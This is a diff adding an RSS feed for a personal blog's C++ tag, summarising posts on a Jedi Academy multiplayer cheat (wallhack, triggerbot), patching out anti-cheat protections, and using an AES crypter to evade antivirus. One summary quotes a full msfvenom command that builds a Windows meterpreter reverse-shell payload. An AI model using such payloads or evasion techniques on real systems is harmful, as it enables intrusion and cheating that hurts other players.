@@ -1,0 +1,74 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>C&#43;&#43; on A Blog.</title>
+    <link>/tags/c&#43;&#43;/</link>
+    <description>Recent content in C&#43;&#43; on A Blog.</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 28 Aug 2018 00:00:00 +0000</lastBuildDate>
+    
+	<atom:link href="/tags/c++/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Crypt0r</title>
+      <link>/project/crypt0r/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/project/crypt0r/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Q3 Engine Multihack</title>
+      <link>/project/jka-multihack/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/project/jka-multihack/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>RandomJK</title>
+      <link>/project/randomjk/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/project/randomjk/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Creating A Multiplayer Game Hack</title>
+      <link>/post/multihack/</link>
+      <pubDate>Tue, 28 Aug 2018 00:00:00 +0000</pubDate>
+      
+      <guid>/post/multihack/</guid>
+      <description>What? This post covers creating a multihack for multiplayer games. The target is a Quake3 based game called Jedi Academy. I&amp;rsquo;ve found the techniques and process of doing this to be fairly undocumented and obscure, so this can serve as a starting point for researchers and game hackers.
+I&amp;rsquo;ve released my multihack source code. These are the implemented features:
+ Wallhack (seeing enemies through walls) Player Glow (Enemies are glowing) Cheat Unlocker (Use otherwise blocked client side settings) Triggerbot (Automatically pull the trigger and shoot at enemies once they are in the crosshair)  This is what the wallhack and player glow looks like:</description>
+    </item>
+    
+    <item>
+      <title>Runtime Function Patching</title>
+      <link>/post/cvar-hax/</link>
+      <pubDate>Thu, 16 Aug 2018 00:00:00 +0000</pubDate>
+      
+      <guid>/post/cvar-hax/</guid>
+      <description>When it comes to patching certain functions of a binary on ASM level, it&amp;rsquo;s often performed by modifying the binary itself. This post shows a different approach to accomplish the same thing: Removing game cheat protections using runtime function patching.
+The Target This is being shown in the following context: Quake3 based multiplayer games include certain settings (CVars) which are disabled for players to prevent cheating. These settings would enable clients to disable fog and shadows and use different camera angles.</description>
+    </item>
+    
+    <item>
+      <title>A Quick Survey on Anti-Anti-Viruses</title>
+      <link>/post/crypt0r/</link>
+      <pubDate>Fri, 16 Mar 2018 00:00:00 +0000</pubDate>
+      
+      <guid>/post/crypt0r/</guid>
+      <description>tl;dr AVs can easily be bypassed using malware AES crypters like Crypt0r:
+Open Source Evasion Techniques All of the following results are based on a meterpreter file which was generated like this:
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -f exe LHOST=192.168.1.1 LPORT=1337 -o meter.exe  All scans are performed on VirusTotal. Please not that this covers static analysis only. However, it will become clear later on that dynamic analysis of the used techniques aren&amp;rsquo;t required at all.</description>
+    </item>
+    
+  </channel>
+</rss>
